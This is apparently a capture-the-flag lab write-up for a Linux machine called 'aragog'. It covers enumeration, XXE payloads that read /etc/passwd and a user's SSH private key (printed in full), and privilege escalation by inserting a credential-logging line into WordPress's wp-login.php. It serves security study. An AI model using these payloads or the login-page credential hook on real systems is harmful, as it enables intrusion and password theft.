
## Lab Details
- Difficulty: Medium
- OS: Linux

## Summary
- Initial access: XXE
- Privilege escalation: Abuse cron job

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.170.117 -p21,22,80 -sC -sV -A
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-03 05:48 EDT
Nmap scan report for 10.129.170.117
Host is up (0.0021s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.17
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA)
|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA)
|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://aragog.htb/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: Host: aragog.htb; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
- Enumerate ftp as anonymous user, identified a file named test.txt
```
$ ftp 10.129.170.117
Connected to 10.129.170.117.
220 (vsFTPd 3.0.3)
Name (10.129.170.117:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45577|)
150 Here comes the directory listing.
-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
226 Directory send OK.
```
- Download and review content it seems to be a html or xml file
```
$ cat test.txt 
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
```
- Use `feroxbuster` to enumerate for files and directories 
```
$ feroxbuster -u http://aragog.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -x .xml,.txt,.php
                                                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://aragog.htb/
 🚩  In-Scope Url          │ aragog.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [xml, txt, php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6143c http://aragog.htb/icons/ubuntu-logo.png
200      GET      375l      968w    11321c http://aragog.htb/
200      GET        3l        6w       46c http://aragog.htb/hosts.php
```
- Identified an endpoint named `hosts.php`
- Which contains some output about hosts 
![[Pasted image 20260603184040.png]]
## Foothold

#### Steps
- Capture request using burpsuite when visiting the `hosts.php`
- We see that its making a post request and data to be `xml`
![[Pasted image 20260603184331.png]]
- Attempt with XXE and we get outputs
![[Pasted image 20260603184320.png]]
- Below is payload to get `/etc/passwd`
```
<!DOCTYPE email [
	 <!ENTITY company SYSTEM "file:///etc/passwd"> 
]>

<details>
    <subnet_mask>&company;</subnet_mask>
    <test></test>
</details>
```
- We see two users 
```
florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
cliff:x:1001:1001::/home/cliff:/bin/bash
```
- Since `ssh` is running on target, attempt to fetch the private key for both user but only able to fetch `florian`'s private key
```
<!DOCTYPE email [
	 <!ENTITY company SYSTEM "file:///home/florian/.ssh/id_rsa"> 
]>

<details>
    <subnet_mask>&company;</subnet_mask>
    <test></test>

```

```
----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
+YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
/oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==
-----END RSA PRIVATE KEY-----
```

![[Pasted image 20260603184530.png]]
- Use florians key to ssh to target
```
$ ssh florian@10.129.170.117 -i key
Last login: Fri Sep 23 08:19:24 2022 from 10.10.14.29
florian@aragog:~$ id
uid=1000(florian) gid=1000(florian) groups=1000(florian)
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- Load and run `pspy64` and inspect the process running 
- We see that its running `/home/cliff/wp-login.py` every minute 
- It might be attempt to login as `cliff` to the wordpress 
```
2026/06/03 04:36:01 CMD: UID=1001  PID=58354  | /usr/bin/python3 /home/cliff/wp-login.py 
2026/06/03 04:36:01 CMD: UID=1001  PID=58353  | /bin/sh -c /usr/bin/python3 /home/cliff/wp-login.py 
2026/06/03 04:36:01 CMD: UID=0     PID=58352  | /usr/sbin/CRON -f 
2026/06/03 04:37:01 CMD: UID=1001  PID=58358  | /usr/bin/python3 /home/cliff/wp-login.py 
2026/06/03 04:37:01 CMD: UID=1001  PID=58357  | /bin/sh -c /usr/bin/python3 /home/cliff/wp-login.py 
2026/06/03 04:37:01 CMD: UID=0     PID=58356  | /usr/sbin/CRON -f 
```
- Enumerate the file system and found wp installation 
- We can attempt to modify the wp-login file to write the login to a file 
```
florian@aragog:/var/www/html/dev_wiki$ cat wp-login.php 
<?php

file_put_contents("creds.txt",$_POST['log']." - ".$_POST['pwd']);

/**
 * WordPress User Page
 *
 * Handles authentication, registering, resetting passwords, forgot password,
 * and other user handling.
 *
 * @package WordPress
 */
<SNIP>
```
- Wait a minute and check the directory found the file containing admin credential
```
florian@aragog:/var/www/html/dev_wiki$ ls
creds.txt  license.txt  wp-activate.php  wp-blog-header.php    wp-config.php  wp-cron.php  wp-links-opml.php  wp-login.php  wp-settings.php  wp-trackback.php
index.php  readme.html  wp-admin         wp-comments-post.php  wp-content     wp-includes  wp-load.php        wp-mail.php   wp-signup.php    xmlrpc.php
florian@aragog:/var/www/html/dev_wiki$ cat creds.txt 
Administrator - !KRgYs(JFO!&MTr)lf
```
 - We can use admin credential to login via ssh as root to target
## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: